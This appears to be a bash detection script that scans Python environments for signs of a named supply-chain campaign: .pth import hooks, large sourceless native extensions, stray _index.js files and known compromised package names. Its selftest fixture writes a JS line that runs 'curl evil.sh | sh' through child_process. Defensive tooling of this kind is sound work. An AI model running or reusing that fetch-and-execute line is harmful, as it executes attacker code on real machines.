#!/usr/bin/env bash
# venv_supply_chain_audit.sh -- pre-use audit for the mini-Shai-Hulud /
# Miasma / Hades supply-chain campaign delivery vectors (llm#644, "pre-use
# audit helper" item -- a DIFFERENT slice of #644 from the exact-version-pin
# fix already merged for the pip-venv Nix-fallback escape hatch, llm#1084 /
# 9ada94e).
#
# Socket.dev documented 471 compromised npm/PyPI artifacts targeting
# bioinformatics and MCP developer communities via three delivery vectors:
#   1. `.pth` startup-hook files bundling a JS payload, executed at Python
#      interpreter startup.
#   2. Native-extension trojans -- malicious code inside compiled `.abi3.so`
#      (or similar `.so`/`.pyd`) files, executed at import time.
#   3. Split loader/payload -- an MCP-themed lookalike package that scans
#      sys.path at runtime for a separately-delivered `_index.js` payload.
#
# This script is DETECTION ONLY. It never deletes, quarantines, or modifies
# anything it scans -- it reads a target tree (a venv, a site-packages dir,
# a node_modules tree) and reports what it found. Remediation is always a
# human decision.
#
# WHAT IT CHECKS
#
#   1. .pth files -- any .pth file whose content contains a line starting
#      with "import " is executed as Python code at interpreter startup
#      (this is the actual .pth file format, not a project convention we
#      invented -- see PEP 235 site.py behaviour). An ordinary .pth file is
#      just a list of paths to add to sys.path, one per line, with no such
#      line. A .pth file WITH an "import " line is unusual enough to
#      warrant review even though legitimate packages occasionally use this
#      mechanism (e.g. some editable installs) -- this check cannot tell
#      the difference between a legitimate use and a malicious one; it can
#      only tell you the file executes code, which is the property this
#      campaign's vector #1 depends on.
#
#   2. Compiled extensions (.abi3.so / .so / .pyd) -- flagged if EITHER:
#        a) the file exceeds NATIVE_EXT_LARGE_BYTES (default 10 MiB), or
#        b) the file exceeds NATIVE_EXT_NOSOURCE_BYTES (default 1 MiB) AND
#           has no sibling .py file sharing its module-name stem in the
#           same directory.
#      LIMITATION (stated per checks-must-distinguish-unknown): this
#      heuristic is APPROXIMATE and will produce false positives on
#      ordinary compiled packages -- compiled-only modules with no .py
#      stub are completely normal in the Python ecosystem (numpy, pandas,
#      many C-extension packages ship this way). The size thresholds exist
#      only to keep noise down on real venvs, not to establish malice. A
#      hit in this category is a "worth a look", never a verdict. Sub-1MiB
#      extensions with no source are NOT flagged at all -- too common and
#      too low-signal to be worth reporting.
#
#   3. index.js-shaped files inside a Python package directory -- any file
#      named `index.js` or `_index.js` found anywhere under the target
#      tree. A JS file living inside what should be a pure-Python
#      distribution is inherently unusual (this is vector #3's exact
#      shape: an MCP-themed lookalike scanning sys.path for a payload
#      file with this name). Flagged with higher confidence when the
#      containing directory also holds a .py file or __init__.py (i.e. it
#      really does look like a Python package directory, not some
#      unrelated JS asset bundled for another reason).
#
#   4. Known campaign-affected / bait package names -- a hardcoded
#      starting list from the issue body (compromised packages, named
#      typosquats, and the named MCP-themed bait pattern). Matched against
#      directory/file basenames anywhere under the target tree, normalising
#      case, hyphens/underscores, and stripping version + .dist-info /
#      .egg-info suffixes. A NAME MATCH ALONE is a strong signal and is
#      reported loudly regardless of version -- the campaign compromised
#      specific VERSIONS of otherwise-legitimate packages, so "the package
#      is present" is exactly the fact worth surfacing, not "is this
#      version known-bad" (this script does not attempt version-level
#      threat intel).
#
# WHAT IT DOES NOT DO
#   - It does not download, query, or compare against any live threat feed.
#   - It does not compute or check file hashes against known-IOC hashes.
#   - It does not distinguish a genuinely malicious .pth/.so from a
#     legitimate one using the same mechanism -- see limitations above.
#   - It does not modify, move, or delete anything.
#
# REPORTING (checks-must-distinguish-unknown)
#   Every run ends with a three-way summary: clean=<N> findings=<N>
#   indeterminate=<N>. A target path that does not exist or cannot be read
#   is INDETERMINATE, never "clean" -- an unreadable tree gives no evidence
#   either way. Individual unreadable subpaths encountered mid-scan are
#   likewise counted as indeterminate, not folded into "clean".
#
# Usage:
#   venv_supply_chain_audit.sh <target-path>
#   venv_supply_chain_audit.sh --selftest
#   venv_supply_chain_audit.sh -h|--help
#
# Exit codes:
#   0  clean (findings=0, indeterminate=0)
#   1  findings present (review needed)
#   2  usage error
#   3  indeterminate (target could not be evaluated at all, or scan was
#      incomplete) -- NOT a pass; treat like a 1 and fix the cause
#
# Origin: JohnGavin/llm#644 ("Add a pre-use audit helper" checklist item).
# Slice boundary: the exact-version-pin requirement for the pip-venv
# Nix-fallback escape hatch is a SEPARATE, already-merged slice of #644
# (llm#1084) -- this script does not touch that surface.

set -uo pipefail

# ---------------------------------------------------------------------------
# Config (overridable via env for testing)
# ---------------------------------------------------------------------------
NATIVE_EXT_LARGE_BYTES="${NATIVE_EXT_LARGE_BYTES:-10485760}"      # 10 MiB
NATIVE_EXT_NOSOURCE_BYTES="${NATIVE_EXT_NOSOURCE_BYTES:-1048576}" # 1 MiB

KNOWN_CAMPAIGN_NAMES=(
    "embiggen"
    "ensmallen"
    "gpsea"
    "pyphetools"
    "phenopacket-store-toolkit"
    "ppkt2synergy"
    "rsquests"
    "tlask"
    "rlask"
    "langchain-core-mcp"
)

# ---------------------------------------------------------------------------
# Arg parsing
# ---------------------------------------------------------------------------
usage() {
    echo "Usage: $(basename "$0") <target-path>" >&2
    echo "       $(basename "$0") --selftest" >&2
    echo "       $(basename "$0") -h|--help" >&2
}

SELFTEST=0
TARGET=""
while [ $# -gt 0 ]; do
    case "$1" in
        --selftest) SELFTEST=1; shift ;;
        -h|--help) usage; exit 0 ;;
        -*) echo "unknown option: $1" >&2; usage; exit 2 ;;
        *)
            if [ -n "$TARGET" ]; then
                echo "unexpected extra argument: $1" >&2
                usage
                exit 2
            fi
            TARGET="$1"
            shift
            ;;
    esac
done

# ---------------------------------------------------------------------------
# Reporting state (populated by run_audit)
# ---------------------------------------------------------------------------
FINDINGS=()
CLEAN=()
INDETERMINATE=()

# Case-insensitive matching for the [[ ]] comparisons below (bash builtin --
# does not affect the external `grep`/`find` calls elsewhere in this script,
# and this script uses `[ ]` (POSIX test), not `[[ ]]`, everywhere else).
shopt -s nocasematch

# Normalise a basename to a comparable package-identity stem, WITHOUT
# forking any external process (basename/sed/tr) -- pure bash parameter
# expansion and regex. On a real site-packages tree this check runs once
# per path under the target (thousands of paths); per-path subprocess
# forks here were the original bottleneck (10 known names x thousands of
# paths x 4 forks/path made the very first real-world smoke test of this
# script effectively hang -- llm#644 fixer dispatch, 2026-08-29).
#
# Sets the global _NORM_RESULT variable rather than echoing, so callers
# avoid a $(...) command-substitution subshell too.
_normalize_pkg_stem() {
    local b="$1"
    b="${b%.dist-info}"
    b="${b%.egg-info}"
    # strip a trailing "-<version-looking-thing>" (e.g. embiggen-0.11.97)
    if [[ "$b" =~ ^(.+)-[0-9][0-9A-Za-z_.+-]*$ ]]; then
        b="${BASH_REMATCH[1]}"
    fi
    # collapse -, _, . into a single separator for loose comparison; case
    # handled by `shopt -s nocasematch` at comparison time, not here.
    b="${b//_/-}"
    b="${b//./-}"
    _NORM_RESULT="$b"
}

# Run the full audit against a directory. Populates FINDINGS/CLEAN/INDETERMINATE.
run_audit() {
    local target="$1"

    if [ ! -e "$target" ]; then
        INDETERMINATE+=("target does not exist: $target")
        return
    fi
    if [ ! -d "$target" ]; then
        INDETERMINATE+=("target is not a directory: $target")
        return
    fi
    if [ ! -r "$target" ]; then
        INDETERMINATE+=("target is not readable (permission denied): $target")
        return
    fi

    # --- Check 1: .pth files -------------------------------------------------
    local pth_err pth_files pth_count=0 pth_flagged=0
    pth_err="$(mktemp "${TMPDIR:-/tmp}/vsca_pth_err.XXXXXX")"
    pth_files="$(find "$target" -type f -name '*.pth' 2>"$pth_err")"
    if [ -s "$pth_err" ]; then
        INDETERMINATE+=(".pth scan: $(wc -l < "$pth_err" | tr -d ' ') path(s) unreadable while searching for .pth files")
    fi
    rm -f "$pth_err"

    if [ -n "$pth_files" ]; then
        while IFS= read -r pf; do
            [ -n "$pf" ] || continue
            pth_count=$((pth_count + 1))
            if [ -r "$pf" ]; then
                if grep -qE '^[[:space:]]*import[[:space:]]' "$pf" 2>/dev/null; then
                    pth_flagged=$((pth_flagged + 1))
                    FINDINGS+=("[.pth executable-hook] $pf -- contains an 'import ...' line, which .pth files execute as Python code at interpreter startup (vector #1: .pth startup hooks). Review the imported module before trusting this environment.")
                fi
            else
                INDETERMINATE+=(".pth file not readable, could not inspect content: $pf")
            fi
        done <<< "$pth_files"
    fi
    if [ "$pth_count" -gt 0 ] && [ "$pth_flagged" -eq 0 ]; then
        CLEAN+=(".pth files: $pth_count checked, 0 contain an executable 'import' line")
    elif [ "$pth_count" -eq 0 ]; then
        CLEAN+=(".pth files: none found under target")
    fi

    # --- Check 2: compiled extensions ----------------------------------------
    local so_err so_files so_count=0 so_flagged=0
    so_err="$(mktemp "${TMPDIR:-/tmp}/vsca_so_err.XXXXXX")"
    so_files="$(find "$target" -type f \( -name '*.abi3.so' -o -name '*.so' -o -name '*.pyd' \) 2>"$so_err")"
    if [ -s "$so_err" ]; then
        INDETERMINATE+=("native-extension scan: $(wc -l < "$so_err" | tr -d ' ') path(s) unreadable while searching for compiled extensions")
    fi
    rm -f "$so_err"

    if [ -n "$so_files" ]; then
        while IFS= read -r sf; do
            [ -n "$sf" ] || continue
            so_count=$((so_count + 1))
            local sz dir base stem has_source=0
            sz="$(wc -c < "$sf" 2>/dev/null | tr -d ' ')"
            sz="${sz:-0}"
            # pure parameter expansion -- no dirname/basename fork per file
            dir="${sf%/*}"
            base="${sf##*/}"
            # module-name stem: strip known compiled-extension suffixes
            stem="$base"
            stem="${stem%.abi3.so}"
            stem="${stem%.so}"
            stem="${stem%.pyd}"
            # also strip an ABI/platform tag segment like ".cpython-311-darwin"
            if [[ "$stem" =~ ^(.+)\.(cpython|cp|pypy)[-_A-Za-z0-9]*$ ]]; then
                stem="${BASH_REMATCH[1]}"
            fi
            [ -f "$dir/$stem.py" ] && has_source=1

            local large=0 nosource_notable=0
            [ "$sz" -ge "$NATIVE_EXT_LARGE_BYTES" ] && large=1
            if [ "$has_source" -eq 0 ] && [ "$sz" -ge "$NATIVE_EXT_NOSOURCE_BYTES" ]; then
                nosource_notable=1
            fi

            if [ "$large" -eq 1 ] || [ "$nosource_notable" -eq 1 ]; then
                so_flagged=$((so_flagged + 1))
                local reason=""
                [ "$large" -eq 1 ] && reason="size ${sz} bytes >= large-threshold ${NATIVE_EXT_LARGE_BYTES}"
                if [ "$nosource_notable" -eq 1 ]; then
                    [ -n "$reason" ] && reason="$reason; "
                    reason="${reason}no sibling $stem.py in $dir (size ${sz} bytes >= ${NATIVE_EXT_NOSOURCE_BYTES})"
                fi
                FINDINGS+=("[native-extension-review, LOW-CONFIDENCE HEURISTIC] $sf -- $reason. This heuristic is approximate: many legitimate compiled-only modules have no .py stub. Treated as 'worth a look', not a verdict (vector #2: native-extension trojans).")
            fi
        done <<< "$so_files"
    fi
    if [ "$so_count" -gt 0 ] && [ "$so_flagged" -eq 0 ]; then
        CLEAN+=("compiled extensions (.abi3.so/.so/.pyd): $so_count checked, 0 exceeded the size/no-source thresholds")
    elif [ "$so_count" -eq 0 ]; then
        CLEAN+=("compiled extensions: none found under target")
    fi

    # --- Check 3: index.js-shaped files inside Python package dirs ----------
    local js_err js_files js_count=0
    js_err="$(mktemp "${TMPDIR:-/tmp}/vsca_js_err.XXXXXX")"
    js_files="$(find "$target" -type f \( -name 'index.js' -o -name '_index.js' \) 2>"$js_err")"
    if [ -s "$js_err" ]; then
        INDETERMINATE+=("index.js scan: $(wc -l < "$js_err" | tr -d ' ') path(s) unreadable while searching for index.js-shaped files")
    fi
    rm -f "$js_err"

    if [ -n "$js_files" ]; then
        while IFS= read -r jf; do
            [ -n "$jf" ] || continue
            js_count=$((js_count + 1))
            local jdir has_py=0
            jdir="${jf%/*}"
            if find "$jdir" -maxdepth 1 -type f \( -name '*.py' -o -name '__init__.py' \) 2>/dev/null | grep -q .; then
                has_py=1
            fi
            if [ "$has_py" -eq 1 ]; then
                FINDINGS+=("[index-js-in-python-package, HIGH CONFIDENCE] $jf -- found alongside .py files in $jdir. A JS payload file inside a Python package directory is the exact shape of vector #3 (split loader/payload scanning sys.path for this file).")
            else
                FINDINGS+=("[index-js-shaped-file] $jf -- unusual filename for this campaign's vector #3, but no sibling .py file found in $jdir so package-directory context is unconfirmed.")
            fi
        done <<< "$js_files"
    fi
    if [ "$js_count" -eq 0 ]; then
        CLEAN+=("index.js / _index.js files: none found under target")
    fi

    # --- Check 4: known campaign / bait package names ------------------------
    # Single pass over the tree, comparing each path's normalised basename
    # against the (precomputed once) normalised known-name list -- pure bash
    # string ops, no per-path/per-name subprocess forks. See
    # _normalize_pkg_stem's comment for why this matters: a naive
    # 10-names x N-paths x 4-forks/path version made the first real-world
    # smoke test against an actual site-packages tree (13,873 paths) hang.
    local name_err all_paths name_hits=0
    name_err="$(mktemp "${TMPDIR:-/tmp}/vsca_names_err.XXXXXX")"
    all_paths="$(find "$target" -maxdepth 6 \( -type d -o -type f \) 2>"$name_err")"
    if [ -s "$name_err" ]; then
        INDETERMINATE+=("package-name scan: $(wc -l < "$name_err" | tr -d ' ') path(s) unreadable while enumerating tree")
    fi
    rm -f "$name_err"

    local -a known_norm=()
    local kn
    for kn in "${KNOWN_CAMPAIGN_NAMES[@]}"; do
        _normalize_pkg_stem "$kn"
        known_norm+=("$_NORM_RESULT")
    done

    if [ -n "$all_paths" ]; then
        while IFS= read -r p; do
            [ -n "$p" ] || continue
            local base="${p##*/}"
            _normalize_pkg_stem "$base"
            local stem_norm="$_NORM_RESULT"
            local idx
            for idx in "${!known_norm[@]}"; do
                if [[ "$stem_norm" == "${known_norm[$idx]}" ]]; then
                    name_hits=$((name_hits + 1))
                    FINDINGS+=("[KNOWN CAMPAIGN/BAIT PACKAGE NAME] $p -- basename matches known-affected/bait name '${KNOWN_CAMPAIGN_NAMES[$idx]}' (llm#644). A name match alone is a strong signal regardless of installed version; review before trusting this dependency.")
                fi
            done
        done <<< "$all_paths"
    fi
    if [ "$name_hits" -eq 0 ]; then
        CLEAN+=("known campaign/bait package names: 0 of ${#KNOWN_CAMPAIGN_NAMES[@]} known names found under target")
    fi
}

# ---------------------------------------------------------------------------
# Report printing + exit-code decision
# ---------------------------------------------------------------------------
print_report_and_exit() {
    local target="$1"
    echo "venv_supply_chain_audit: target=$target"
    echo ""

    if [ "${#FINDINGS[@]}" -gt 0 ]; then
        echo "FINDINGS (${#FINDINGS[@]}):"
        local f
        for f in "${FINDINGS[@]}"; do
            echo "  - $f"
        done
        echo ""
    fi

    if [ "${#CLEAN[@]}" -gt 0 ]; then
        echo "CLEAN (${#CLEAN[@]}):"
        local c
        for c in "${CLEAN[@]}"; do
            echo "  - $c"
        done
        echo ""
    fi

    if [ "${#INDETERMINATE[@]}" -gt 0 ]; then
        echo "INDETERMINATE (${#INDETERMINATE[@]}):"
        local i
        for i in "${INDETERMINATE[@]}"; do
            echo "  - $i"
        done
        echo ""
    fi

    echo "summary: clean=${#CLEAN[@]} findings=${#FINDINGS[@]} indeterminate=${#INDETERMINATE[@]}"

    if [ "${#FINDINGS[@]}" -gt 0 ]; then
        exit 1
    elif [ "${#INDETERMINATE[@]}" -gt 0 ]; then
        exit 3
    else
        exit 0
    fi
}

# ---------------------------------------------------------------------------
# Selftest: fabricated fixtures only, never a real venv/site-packages tree.
# ---------------------------------------------------------------------------
run_selftest() {
    local pass=0 total=0
    _check() {
        total=$((total + 1))
        if [ "$1" = "0" ]; then
            pass=$((pass + 1))
            echo "PASS  $2"
        else
            echo "FAIL  $2 (got: $3)"
        fi
    }

    local work
    work="$(mktemp -d "${TMPDIR:-/tmp}/vsca_selftest.XXXXXX")"

    # --- Fixture 1: clean ----------------------------------------------------
    local clean_dir="$work/clean/lib/python3.11/site-packages"
    mkdir -p "$clean_dir/normalpkg"
    printf '/some/added/path\n/another/path\n' > "$clean_dir/normal.pth"
    printf 'def f():\n    return 1\n' > "$clean_dir/normalpkg/mod.py"
    printf 'source' > "$clean_dir/normalpkg/mod.py"
    # matching source for the .so, small size -> should not be flagged
    printf 'x' > "$clean_dir/normalpkg/fastmod.py"
    head -c 100 /dev/zero > "$clean_dir/normalpkg/fastmod.cpython-311-darwin.so" 2>/dev/null \
        || dd if=/dev/zero of="$clean_dir/normalpkg/fastmod.cpython-311-darwin.so" bs=100 count=1 >/dev/null 2>&1

    set +e
    out1="$(bash "$0" "$clean_dir" 2>&1)"
    rc1=$?
    set -e
    if [ "$rc1" -eq 0 ] && printf '%s' "$out1" | grep -q 'findings=0'; then
        _check 0 "clean fixture reports findings=0 and exits 0"
    else
        _check 1 "clean fixture reports findings=0 and exits 0" "rc=$rc1"
    fi

    # --- Fixture 2: suspicious .pth (executable import line) ----------------
    local pth_dir="$work/badpth/site-packages"
    mkdir -p "$pth_dir"
    printf 'import badhook\n' > "$pth_dir/evil.pth"
    set +e
    out2="$(bash "$0" "$pth_dir" 2>&1)"
    rc2=$?
    set -e
    if [ "$rc2" -eq 1 ] && printf '%s' "$out2" | grep -q 'executable-hook'; then
        _check 0 "suspicious .pth with 'import' line is flagged and exits 1"
    else
        _check 1 "suspicious .pth with 'import' line is flagged and exits 1" "rc=$rc2"
    fi

    # --- Fixture 3: suspicious _index.js inside a package dir ---------------
    local js_dir="$work/badjs/site-packages/somepkg"
    mkdir -p "$js_dir"
    printf 'def f(): pass\n' > "$js_dir/__init__.py"
    printf 'require("child_process").exec("curl evil.sh | sh")\n' > "$js_dir/_index.js"
    set +e
    out3="$(bash "$0" "$work/badjs/site-packages" 2>&1)"
    rc3=$?
    set -e
    if [ "$rc3" -eq 1 ] && printf '%s' "$out3" | grep -q 'index-js-in-python-package'; then
        _check 0 "_index.js beside .py files is flagged and exits 1"
    else
        _check 1 "_index.js beside .py files is flagged and exits 1" "rc=$rc3"
    fi

    # --- Fixture 4: known campaign package name present ----------------------
    local name_dir="$work/badname/site-packages"
    mkdir -p "$name_dir/embiggen-0.11.97.dist-info"
    printf 'Metadata-Version: 2.1\n' > "$name_dir/embiggen-0.11.97.dist-info/METADATA"
    set +e
    out4="$(bash "$0" "$name_dir" 2>&1)"
    rc4=$?
    set -e
    if [ "$rc4" -eq 1 ] && printf '%s' "$out4" | grep -q 'KNOWN CAMPAIGN/BAIT PACKAGE NAME'; then
        _check 0 "known campaign package name is flagged and exits 1"
    else
        _check 1 "known campaign package name is flagged and exits 1" "rc=$rc4"
    fi

    # --- Fixture 5: nonexistent target -> INDETERMINATE, never clean --------
    set +e
    out5="$(bash "$0" "$work/does_not_exist_at_all" 2>&1)"
    rc5=$?
    set -e
    if [ "$rc5" -eq 3 ] && printf '%s' "$out5" | grep -q 'INDETERMINATE' && ! printf '%s' "$out5" | grep -q 'summary: clean=[0-9]* findings=0 indeterminate=0$'; then
        _check 0 "nonexistent target reports INDETERMINATE and exits 3 (never silently clean)"
    else
        _check 1 "nonexistent target reports INDETERMINATE and exits 3 (never silently clean)" "rc=$rc5"
    fi

    # --- Fixture 6 (bonus): oversized native extension with no source -------
    local so_dir="$work/badso/site-packages/pkgso"
    mkdir -p "$so_dir"
    dd if=/dev/zero of="$so_dir/mystery.cpython-311-darwin.so" bs=1048576 count=2 >/dev/null 2>&1
    set +e
    out6="$(bash "$0" "$so_dir" 2>&1)"
    rc6=$?
    set -e
    if [ "$rc6" -eq 1 ] && printf '%s' "$out6" | grep -q 'native-extension-review'; then
        _check 0 "oversized no-source native extension is flagged and exits 1"
    else
        _check 1 "oversized no-source native extension is flagged and exits 1" "rc=$rc6"
    fi

    rm -rf "$work"
    echo ""
    echo "venv_supply_chain_audit selftest: $pass/$total PASS"
    [ "$pass" -eq "$total" ] && return 0
    return 1
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
if [ "$SELFTEST" -eq 1 ]; then
    run_selftest
    exit $?
fi

if [ -z "$TARGET" ]; then
    echo "missing required <target-path>" >&2
    usage
    exit 2
fi

run_audit "$TARGET"
print_report_and_exit "$TARGET"
